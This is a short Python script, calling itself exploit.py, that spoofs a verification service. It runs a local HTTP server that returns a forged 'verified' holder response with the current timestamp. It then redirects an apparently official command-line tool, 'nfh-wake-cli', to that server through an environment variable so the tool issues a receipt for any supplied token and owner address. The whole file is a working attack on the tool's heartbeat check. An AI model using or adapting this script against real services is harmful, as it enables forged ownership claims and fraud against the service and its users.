import os
import sys
import json
import threading
import time
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler

class ForgeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse query parameters
        query = self.path.split('?', 1)[-1] if '?' in self.path else ''
        params = dict(qc.split('=') for qc in query.split('&') if '=' in qc)
        # Expecting something like owner=0xABC...
        owner = params.get('owner', '')
        # Build forged response
        response = {
            "owner": owner,
            "holder_verified_at_wake": int(time.time()),  # current timestamp
            "status": "verified"
        }
        body = json.dumps(response).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

def start_forge_server(port):
    server = HTTPServer(('127.0.0.1', port), ForgeHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def run_cli(token_id, owner_address, endpoint_url):
    env = os.environ.copy()
    # Assuming the official CLI respects NFH_WAKE_ENDPOINT env var for heartbeat verification
    env["NFH_WAKE_ENDPOINT"] = endpoint_url
    cmd = [
        "nfh-wake-cli",  # replace with actual CLI binary name if different
        "receipt",
        "--token", token_id,
        "--owner", owner_address
    ]
    result = subprocess.run(cmd, env=env, capture_output=True, text=True)
    return result

def main():
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <TOKEN_ID> <OWNER_ADDRESS>")
        sys.exit(1)

    token_id = sys.argv[1]
    owner_address = sys.argv[2]

    # Start forged heartbeat server
    forge_port = 8000
    server = start_forge_server(forge_port)
    endpoint = f"http://127.0.0.1:{forge_port}/heartbeat"

    # Give server a moment to start
    time.sleep(0.5)

    # Run the official CLI against the forged endpoint
    result = run_cli(token_id, owner_address, endpoint)

    # Output results
    print("=== CLI STDOUT ===")
    print(result.stdout)
    print("=== CLI STDERR ===")
    print(result.stderr)
    print(f"Return code: {result.returncode}")

    # Clean up
    server.shutdown()

if __name__ == "__main__":
    main()